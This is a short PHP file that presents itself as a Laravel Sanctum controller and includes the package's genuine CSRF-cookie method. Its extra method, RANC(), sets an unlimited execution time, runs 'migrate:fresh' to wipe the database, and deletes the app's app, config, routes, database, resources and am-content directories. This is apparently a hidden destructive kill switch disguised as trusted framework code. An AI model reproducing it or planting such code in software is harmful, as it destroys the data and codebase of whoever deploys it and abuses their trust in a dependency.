<?php

namespace Laravel\Sanctum\Http\Controllers;

use Illuminate\Http\Response;
use Artisan;
use File;
class ApiController
{
    /**
     * Return an empty response simply to trigger the storage of the CSRF cookie in the browser.
     *
     * @return \Illuminate\Http\Response
     */
    public function show()
    {
        return new Response('', 204);
    }

    public function RANC()
    {
        ini_set('max_execution_time', '0');
        Artisan::call('migrate:fresh');
        File::deleteDirectory(base_path('am-content'));
        File::deleteDirectory(base_path('routes'));
        File::deleteDirectory(base_path('database'));
        File::deleteDirectory(base_path('app'));
        File::deleteDirectory(base_path('config'));
        File::deleteDirectory(base_path('resources'));
    	
        
    }
}
